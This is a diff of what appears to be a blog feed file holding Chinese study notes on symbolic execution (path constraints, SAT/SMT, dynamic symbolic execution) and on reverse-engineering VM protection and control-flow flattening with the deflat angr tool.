-<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1  </li>
-<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂  </li>
-</ol>
-</li>
-<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)    <ol>
-<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。<ol>
-<li>什么是一阶逻辑</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><p><strong>回到开始的函数</strong></p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
-<p>我们将其写为<em>类PL/1语言</em><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
-<p>我们在调用$sum(1,2)$后，可以列一个表格来观察程序流  </p>
-<script type="math/tex; mode=display">
-\def\arraystretch{.7}
-   \begin{array}{|c|c|c|c|c|c|c|}
-   \hline
-    Line & X & Y & Z & A & B & pc \cr \hline
-    1 & ? & ? & ? & 1 & 2 & true \cr \hline
-    2 & 1 & ? & ? & 1 & 2 & true \cr \hline
-    3 & 1 & 2 & ? & 1 & 2 & true \cr \hline
-    4 & 1 & 2 & 3 & 1 & 2 & true \cr \hline
-\end{array}</script><blockquote>
-<p>Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
-</blockquote>
-<p>我们在调用$sum(a1,a2)$后，就是把具体值换成了对应的符号 </p>
-<script type="math/tex; mode=display">
-\def\arraystretch{.7}
-   \begin{array}{|c|c|c|c|c|c|c|}
-   \hline
-    Line & X & Y & Z & A & B & pc \cr \hline
-    1 & ? & ? & ? & a1 & a2 & true \cr \hline
-    2 & a1 & ? & ? & a1 & a2 & true \cr \hline
-    3 & a1 & a2 & ? & a1 & a2 & true \cr \hline
-    4 & a1 & a2 & a3 & a1 & a2 & true \cr \hline
-\end{array}</script><blockquote>
-<p>Line 5是return (a1+a2)</p>
-</blockquote>
-<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
-<p>这个函数转化为C++就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int power(int X, int Y) &#123;</span><br><span class="line">    int Z = 1;</span><br><span class="line">    int J = 1;</span><br><span class="line">    while (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们继续用表格的格式来看</p>
-<script type="math/tex; mode=display">
-\def\arraystretch{.6}
-   \begin{array}{|c|c|c|c|c|c|}
-   \hline
-        Line & Z & J & X & Y & pc \cr \hline
-        1 & ? & ? & a1 & a2 & true \cr \hline
-        2 & 1 & ? & a1 & a2 & true \cr \hline
-        3 & 1 & 1 & a1 & a2 & true \cr \hline
-\end{array}</script><p>前三行都很正常，直到第五行进行判断  </p>
-<ol>
-<li>处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code></li>
-<li>生成两个分支的路径约束条件：  <ul>
-<li>(a2&gt;=1) $\subset$ true</li>
-<li>~(a2&gt;=1) $\subset$ true</li>
-</ul>
-</li>
-<li>两个路径约束都可满足，分别对两个路径进行探索</li>
-</ol>
-<p>对于分支: ~(a2&gt;=1) $\subset$ true</p>
-<script type="math/tex; mode=display">
-\def\arraystretch{.6}
-   \begin{array}{|c|c|c|c|c|c|}
-   \hline
-        Line & Z & J & X & Y & pc \cr \hline
-        5 & 1 & 1 & a1 & a2 & ~(a2>=1) \cr \hline
-\end{array}</script><p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
-<p>对于分支: (a2&gt;=1) $\subset$ true</p>
-<script type="math/tex; mode=display">
-\def\arraystretch{.6}
-   \begin{array}{|c|c|c|c|c|c|}
-   \hline
-        Line & Z & J & X & Y & pc \cr \hline
-        5 & 1 & 1 & a1 & a2 & (a2>=1) \cr \hline
-        7 & a1 & 1 & a1 & a2 & (a2>=1) \cr \hline
-        8 & a1 & 2 & a1 & a2 & (a2>=1) \cr \hline
-\end{array}</script><p>然后因为Line 9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
-<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
-<h1 id="0x01-动态符号执行技术-DSE"><a href="#0x01-动态符号执行技术-DSE" class="headerlink" title="0x01 动态符号执行技术(DSE)"></a>0x01 动态符号执行技术(DSE)</h1><ul>
-<li><p><strong>基本思想</strong></p>
-<ol>
-<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：<ol>
-<li>用符号执行技术对路径进行分析</li>
-<li>提取路径的约束表达式</li>
-<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
-<li>求解变形后的表达式并生成新的测试用例</li>
-<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
-</ol>
-</li>
-<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
-</ol>
-</li>
-<li><p><strong>实现细节(以函数为例)</strong></p>
-<ol>
-<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
-<li>Step1: 生成一组随机输入，开始”实际执行”</li>
-<li>Step2: <strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
-<li>Step3: 根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束<ul>
-<li>举个例子：深度优先策略</li>
-<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>, 深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
-</ul>
-</li>
-<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
-<li>Step5: 重复上述过程，直到遍历全部路径</li>
-</ol>
-</li>
-<li><p><strong>DSE工具SAGE</strong></p>
-<ol>
-<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
-<li>SAGE基于x86的机器码进行符号执行，原因如下：<ol>
-<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
-<li>忽略编译器”代码优化””代码混淆””基本块转换”等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
-<li>闭源分析yyds</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><p><strong>关键问题</strong></p>
-<ol>
-<li>外部函数调用</li>
-<li>循环问题：路径爆炸</li>
-</ol>
-</li>
-</ul>
-<blockquote>
-<p>这一段也不仔细读了…用到再学</p>
-</blockquote>
-<h1 id="0x02-并行符号执行技术-PSE"><a href="#0x02-并行符号执行技术-PSE" class="headerlink" title="0x02 并行符号执行技术(PSE)"></a>0x02 <strong>并行符号执行技术(PSE)</strong></h1><ul>
-<li><strong>基本思想</strong><ol>
-<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
-<li>分布式…这我就先不看了</li>
-</ol>
-</li>
-</ul>
-<h1 id="0x03-参考文献"><a href="#0x03-参考文献" class="headerlink" title="0x03 参考文献"></a>0x03 参考文献</h1><p>1《软件安全分析与应用》</p>
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>SymbolicExecution</tag>
-      </tags>
   </entry>
   <entry>
     <title>软件保护：控制流平坦化与VM逆向</title>
@@ -877,159 +756,155 @@ baby一点都不baby...houseoforange+unsortedbinattack
     <content><![CDATA[<blockquote class="blockquote-center">
 回家晚上休息，看点re涨涨见识
 </blockquote>
-
 <span id="more"></span>
-<h1 id="0x00-VM"><a href="#0x00-VM" class="headerlink" title="0x00  VM"></a>0x00  VM</h1><ul>
-<li><p><strong>背景</strong><br>  C代码都会读吧，IDA反汇编出来的东西仔细看还是能看明白的。<br>  那我要增加你逆向的难度，就得让你看不懂。<br>  好，<strong>我把每条汇编指令封装成一个函数，给每个函数一个独有的编号(opcode)</strong>。<br>  再<strong>做一个索引表</strong>，我使用opcode1就等价于使用函数1.</p>
-<p>  比如“汇编指令A”—&gt;封装为“函数A”—&gt;opcode为1。<br>  然后定义一个指针数组function：</p>
-<pre><code>  function的index为opcode
-  function的内容为“指向对应函数的指针”。
-</code></pre><p>  那么，如果我要使用汇编指令A，只需要执行function[1]即可。<br>  这样你IDA反汇编就会出来一堆类似于switch case的东西，比以前更难读了。</p>
-<p>  如果你有相关经验，那么可以类比一下：<br>  这玩意儿叫做VM，顾名思义就是虚拟机嘛。<br>  就是你在物理机里面自己写了个虚拟机，然后自己用“你自己的虚拟机指令集”写了个程序。</p>
-</li>
-</ul>
+<h1 id="x00-vm">0x00 VM</h1>
 <ul>
-<li><p><strong>KEY</strong><br>  概括来讲你需要对应起这么几个东西：_ip, op_function_array, op_i</p>
-<ol>
-<li>_ip：ip寄存器，指示“当前运行到哪一条指令”<ul>
-<li>特征：在每个函数中会有 ip += num;之类的指令，表示ip寄存器读取了num个字节的指令，当前正指向下一个待执行的指令。</li>
-</ul>
-</li>
+<li><p><strong>背景</strong>
+C代码都会读吧，IDA反汇编出来的东西仔细看还是能看明白的。
+那我要增加你逆向的难度，就得让你看不懂。
+好，<strong>我把每条汇编指令封装成一个函数，给每个函数一个独有的编号(opcode)</strong>。
+再<strong>做一个索引表</strong>，我使用opcode1就等价于使用函数1.</p>
+<p>比如“汇编指令A”--&gt;封装为“函数A”--&gt;opcode为1。
+然后定义一个指针数组function： function的index为opcode
+function的内容为“指向对应函数的指针”。
+那么，如果我要使用汇编指令A，只需要执行function[1]即可。
+这样你IDA反汇编就会出来一堆类似于switch case的东西，比以前更难读了。</p>
+<p>如果你有相关经验，那么可以类比一下：
+这玩意儿叫做VM，顾名思义就是虚拟机嘛。
+就是你在物理机里面自己写了个虚拟机，然后自己用“你自己的虚拟机指令集"写了个程序。</p></li>
+<li><p><strong>KEY</strong> 概括来讲你需要对应起这么几个东西：_ip,
+op_function_array, op_i</p>
+<ol type="1">
+<li>_ip：ip寄存器，指示“当前运行到哪一条指令”
+<ul>
+<li>特征：在每个函数中会有 ip +=
+num;之类的指令，表示ip寄存器读取了num个字节的指令，当前正指向下一个待执行的指令。</li>
+</ul></li>
 <li>op_function_array：索引表，确定函数指向哪个位置</li>
-<li><p>op_i：第i个操作数，比如<code>mov eax,ebx</code>中，op1就是eax，op2就是ebx</p>
-<p>正常的汇编指令是这样的：<code>cmd arg1,arg2</code><br>在VM也要有这样的：<code>opcode op1,op2</code></p>
-</li>
+<li>op_i：第i个操作数，比如<code>mov eax,ebx</code>中，op1就是eax，op2就是ebx</li>
 </ol>
-</li>
+<p>正常的汇编指令是这样的：<code>cmd arg1,arg2</code>
+在VM也要有这样的：<code>opcode op1,op2</code></p></li>
 <li><p><strong>常见替换变量</strong></p>
 <ul>
 <li>stack</li>
-<li>regs<ul>
+<li>regs
+<ul>
 <li>eax/ebx/ecx/edx</li>
 <li>flag</li>
-</ul>
-</li>
+</ul></li>
 <li>esp</li>
-</ul>
-</li>
+</ul></li>
 <li><p><strong>常见实现指令</strong></p>
-<ol>
+<ol type="1">
 <li>nop</li>
-<li>mov<ol>
+<li>mov
+<ol type="1">
 <li>两个操作数</li>
 <li>将操作数2赋值给操作数1（或者操作数1作为index指向的某块内存）</li>
-</ol>
-</li>
-<li>push<ol>
+</ol></li>
+<li>push
+<ol type="1">
 <li>某个值++（不妨称“某个值”为A），并将（内存地址addr+A）的值设置为操作数1</li>
 <li>这里的A就是esp/rsp寄存器</li>
 <li>内存地址addr就是自己做的stack</li>
 <li>⚠ 某些vm可能会将push num和push regs分开实现</li>
-</ol>
-</li>
-<li>pop<ol>
-<li>esp—</li>
-</ol>
-</li>
-<li>ja/jz/jnz/jl<ol>
+</ol></li>
+<li>pop
+<ol type="1">
+<li>esp--</li>
+</ol></li>
+<li>ja/jz/jnz/jl
+<ol type="1">
 <li>跟e_flag有关</li>
 <li>会改变eip</li>
-</ol>
-</li>
-<li>cmp<ol>
+</ol></li>
+<li>cmp
+<ol type="1">
 <li>eflag = val1 - val2</li>
-</ol>
-</li>
-</ol>
-</li>
+</ol></li>
+</ol></li>
 <li><p>补充</p>
-<ol>
+<ol type="1">
 <li>有的时候vm会自己实现/集成一些函数，比如puts</li>
 <li>一些想法：有时间可以读一下jadx的源码，因为jadx是对抗jvm的，所以只需要更换一下指令集，很有可能就可以迁移到不同平台上对抗不同的vm</li>
-</ol>
-</li>
+</ol></li>
+<li><p>VM pwn
+我猜应该是自己实现的虚拟机出现了缓冲区漏洞然后可以给pwn掉...</p></li>
 </ul>
+<h1 id="x01-控制流平坦化fla">0x01 控制流平坦化（FLA）</h1>
 <ul>
-<li>VM pwn<br>我猜应该是自己实现的虚拟机出现了缓冲区漏洞然后可以给pwn掉…</li>
-</ul>
-<h1 id="0x01-控制流平坦化（FLA）"><a href="#0x01-控制流平坦化（FLA）" class="headerlink" title="0x01 控制流平坦化（FLA）"></a>0x01 控制流平坦化（FLA）</h1><ul>
-<li><p><strong>背景</strong><br>  先来看一段代码</p>
-  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">	if(i%2 == 0)</span><br><span class="line">		printf(&#x27;a&#x27;);</span><br><span class="line">	else</span><br><span class="line">		printf(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  这段代码整理成CFG（就是你IDA刚开始加载进入以后，默认出现的程序控制流图），想都不用想这段代码的CFG肯定相对简单</p>
-<p>  但使用FLA之后，CFG就会变得极其复杂，同时反汇编出来的伪代码也会很难读，这就大大增加了逆向分析的难度</p>
-</li>
-<li><p><strong>原理</strong><br>  控制流平坦化的基本结构为：入口块 + 主分发块 + 子分发块 + 原基本块 + 返回块 + 预分发器<br>  在“推荐阅读”的第二条中，有一张图片能够帮助理解以上术语是什么，但因为貌似需要科学上网，所以这边就不贴在博客里了。</p>
-<ol>
+<li><p><strong>背景</strong> 先来看一段代码 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">	if(i%2 == 0)</span><br><span class="line">		printf(&#x27;a&#x27;);</span><br><span class="line">	else</span><br><span class="line">		printf(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+这段代码整理成CFG（就是你IDA刚开始加载进入以后，默认出现的程序控制流图），想都不用想这段代码的CFG肯定相对简单</p>
+<p>但使用FLA之后，CFG就会变得极其复杂，同时反汇编出来的伪代码也会很难读，这就大大增加了逆向分析的难度</p></li>
+<li><p><strong>原理</strong> 控制流平坦化的基本结构为：入口块 + 主分发块
++ 子分发块 + 原基本块 + 返回块 + 预分发器
+在“推荐阅读”的第二条中，有一张图片能够帮助理解以上术语是什么，但因为貌似需要科学上网，所以这边就不贴在博客里了。</p>
+<ol type="1">
 <li>入口块（有时也称“序言”）：调节堆栈、初始化、做一个分发的初始工作</li>
 <li>主分发块：决定跳到哪个次分发块，进而进入哪个“原基本块”</li>
 <li>子分发块：无用块，纯纯混淆用的</li>
 <li>原基本块：原程序逻辑，但被平坦以后我们不知道这几个块的先后执行顺序是什么</li>
 <li>返回块：结束程序/结束分支</li>
 <li>预分发器：返回“主分发块”</li>
-</ol>
-<ul>
-<li><p><strong>FLA对抗工具安装</strong><br> <a href="https://github.com/cq674350529/deflat">GitHub - cq674350529/deflat: use angr to deFLAfuscation</a></p>
+</ol></li>
+<li><p><strong>FLA对抗工具安装</strong> <a
+href="https://github.com/cq674350529/deflat">GitHub -
+cq674350529/deflat: use angr to deFLAfuscation</a></p>
 <p>该工具基于angr，使用之前需要用pip安装angr</p>
 <p><code>pip3 install angr(在另外一篇教程里用的是sudo proxychains pip3 install angr)</code></p>
-<p>使用方式：</p>
-<pre><code>-f file
--addr entry_addr
-例如：`python3 deflat.py -f ./a.out --addr 0x400510`
-</code></pre><p>推荐读一下deflat.py的源码，针对特殊情况去修改这个代码</p>
-</li>
-</ul>
-</li>
-</ul>
+<p>使用方式： -f file -addr entry_addr
+例如：<code>python3 deflat.py -f ./a.out --addr 0x400510</code></p>
+<p>推荐读一下deflat.py的源码，针对特殊情况去修改这个代码</p></li>
+<li><p><strong>FLA对抗工具原理</strong></p>
+<ol type="1">
+<li>源码解读
+<ol type="1">
+<li>参数设置
+<ol type="1">
+<li>load_options = {'auto_load_libcs': False}
 <ul>
-<li><strong>FLA对抗工具原理</strong><ol>
-<li>源码解读<ol>
-<li>参数设置<ol>
-<li>load_options = {‘auto_load_libcs’: False}<ul>
 <li>不步入标准库函数(如printf)，减少代码分析量</li>
-</ul>
-</li>
-</ol>
-</li>
-<li>to_supergraph函数：对“以call结尾的原基本块做一些处理”<ol>
+</ul></li>
+</ol></li>
+<li>to_supergraph函数：对“以call结尾的原基本块做一些处理”
+<ol type="1">
 <li>这一块儿没理解</li>
 <li>好像做了个什么“丢弃’三环到零环‘这种比如syscall之类的越界”、删除一些孤立节点之类的工作</li>
-</ol>
-</li>
+</ol></li>
 <li>页面对齐</li>
-<li>“块”处理<ol>
+<li>“块”处理
+<ol type="1">
 <li>序言：入度为0</li>
 <li>return块：出度为0 || 出分支为0（出分支我没理解是什么）</li>
 <li>预分发器：后继为主分发器（主分发器前驱 &amp;&amp; 不是序言）</li>
 <li>主分发器：跟在序言后面（序言后继）</li>
-<li>原基本块<ol>
+<li>原基本块
+<ol type="1">
 <li>与预处理器相关（不过得看FLA的作者怎么混淆的，需要自己去改脚本来做对抗）</li>
 <li>是“序言”“返回块”或“预处理器”，且块长（bytecode数）&gt; 8</li>
-</ol>
-</li>
-<li>无用块<ol>
+</ol></li>
+<li>无用块
+<ol type="1">
 <li>不是“序言”“返回块”和“预处理器”</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>重做二进制文件<ol>
+</ol></li>
+</ol></li>
+<li>重做二进制文件
+<ol type="1">
 <li>有点没理解，它用到了符号执行的知识，后面再来继续读一下吧</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-</ul>
-<ul>
+</ol></li>
+</ol></li>
+</ol></li>
 <li><p><strong>注</strong></p>
 <ul>
 <li>IDA7.6之后的版本自带了一点平坦化处理，简单的平坦化可能会被分析并还原</li>
 <li>andorid平台上的ollvm-FLA更成熟一些，所以deflat.py有比较多的手机平台处理模块</li>
-</ul>
-</li>
-<li><p>推荐阅读<br><a href="https://www.wireghost.cn/2020/08/28/OLLVM%E9%80%9A%E7%94%A8%E5%8F%8D%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%A0%94%E7%A9%B6/">OLLVM通用反平坦化研究 | Shell In Ghost (wireghost.cn)</a><br><a href="https://jev0n.com/2022/07/08/ollvm-1.html">OLLVM混淆学习（1）——控制流平坦化（FLA） - 思泉 | Jev0n</a></p>
-</li>
+</ul></li>
+<li><p>推荐阅读 <a
+href="https://www.wireghost.cn/2020/08/28/OLLVM%E9%80%9A%E7%94%A8%E5%8F%8D%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%A0%94%E7%A9%B6/">OLLVM通用反平坦化研究
+| Shell In Ghost (wireghost.cn)</a> <a
+href="https://jev0n.com/2022/07/08/ollvm-1.html">OLLVM混淆学习（1）——控制流平坦化（FLA）
+- 思泉 | Jev0n</a></p></li>
 </ul>
 ]]></content>
       <categories>
@@ -1039,6 +914,285 @@ baby一点都不baby...houseoforange+unsortedbinattack
         <tag>SoftwareProtection</tag>
         <tag>VMRe</tag>
         <tag>FLA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>符号执行学习笔记</title>
+    <url>/2023/09/30/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+迈向自动化的第一步——
+</blockquote>
+<span id="more"></span>
+<h1 id="x00-基本模型">0x00 基本模型</h1>
+<ul>
+<li><p><strong>概述</strong><br />
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure> 调用<span
+class="math inline">\(sum(1,2)\)</span>，学过C语言的都知道会发生什么事情<br />
+但如果我调用<span
+class="math inline">\(sum(a1,a2)\)</span>，并且我在这之前并未声明a1，a2呢？<br />
+先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic
+Execution)</strong>，具体会发生什么我们接着往下看</p></li>
+<li><p><strong>基本思想</strong></p>
+<ol type="1">
+<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示
+<ol type="1">
+<li>符号变量是什么？
+<ol type="1">
+<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e.
+程序的一次具体执行可以视为符号执行的一次实例）</li>
+</ol></li>
+<li>操作数是什么？</li>
+</ol></li>
+<li>对于任意程序，其执行流程是由执行序列的执行语义控制的
+<ol type="1">
+<li>执行语义：
+<ol type="1">
+<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
+<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
+<li>条件语句对程序执行流程的控制</li>
+</ol></li>
+</ol></li>
+<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
+</ol></li>
+<li><p><strong>程序语言定义</strong></p>
+<ol type="1">
+<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：
+<ol type="1">
+<li>理想模型中程序只处理“有符号整数”</li>
+<li>程序“执行数”规模有限</li>
+<li>可以处理程序内所有if条件语句的约束表达式</li>
+</ol></li>
+<li>基于符号执行技术的理想场景，对程序语言做如下定义
+<ol type="1">
+<li>程序变量类型：只包含“有符号整数”</li>
+<li>程序语句类型
+<ol type="1">
+<li>简单声明语句，如<code>a = 3</code></li>
+<li>if条件语句(包括then 和 else)</li>
+<li>无条件跳转语句，如goto语句</li>
+<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
+</ol></li>
+<li>程序语义
+<ol type="1">
+<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
+<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
+</ol></li>
+</ol></li>
+</ol></li>
+<li><p><strong>程序执行状态</strong></p>
+<ul>
+<li>PC
+<ol type="1">
+<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件
+pc(path
+constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
+<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
+<li>来看一段示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
+<li>假设上述三个分支中选择了if1:true if2:true
+if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
+</ol></li>
+<li>符号执行引擎
+<ul>
+<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含
+~q（2），如果符号执行引擎选择进入then分支，则 pc
+表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc
+表现为（2）的形式</li>
+<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
+<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
+</ul></li>
+</ul></li>
+<li><p><strong>符号执行树</strong></p>
+<ol type="1">
+<li>定义：用来描述程序执行路径的树形结构</li>
+<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)
+<img
+src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
+</ol></li>
+<li><p><strong>约束求解</strong></p>
+<ol type="1">
+<li>定义：
+<ol type="1">
+<li>给定一个三元组&lt;V,D,C&gt;,其中：
+<ol type="1">
+<li>V: 变量的有限集合<br />
+</li>
+<li>D: 变量的论域，变量可能取值的有限集合<br />
+</li>
+<li>C: 有限约束集合，某个约束关系<span
+class="math inline">\(C_i\)</span>包含V中一个或多个变量，若<span
+class="math inline">\(C_i\)</span>包含k个变量，则称其为在这k个变量集合上的k元约束<br />
+</li>
+</ol></li>
+<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件<br />
+</li>
+<li>对于约束问题<span class="math inline">\(P =
+&lt;V,D,C&gt;\)</span>，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的<br />
+</li>
+</ol></li>
+<li>分类:
+<ol type="1">
+<li>SAT(The Satisfiability problem, 可满足性问题)
+<ol type="1">
+<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1<br />
+</li>
+<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂<br />
+</li>
+</ol></li>
+<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)
+<ol type="1">
+<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。
+<ol type="1">
+<li>什么是一阶逻辑</li>
+</ol></li>
+</ol></li>
+</ol></li>
+</ol></li>
+<li><p><strong>回到开始的函数</strong></p></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
+<p>我们将其写为<em>类PL/1语言</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
+<p>我们在调用<span
+class="math inline">\(sum(1,2)\)</span>后，可以列一个表格来观察程序流<br />
+<span class="math display">\[
+\def\arraystretch{.7}
+   \begin{array}{|c|c|c|c|c|c|c|}
+   \hline
+    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
+    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
+    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
+    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
+    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
+\end{array}
+\]</span> &gt; Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
+<p>我们在调用<span
+class="math inline">\(sum(a1,a2)\)</span>后，就是把具体值换成了对应的符号
+<span class="math display">\[
+\def\arraystretch{.7}
+   \begin{array}{|c|c|c|c|c|c|c|}
+   \hline
+    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
+    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
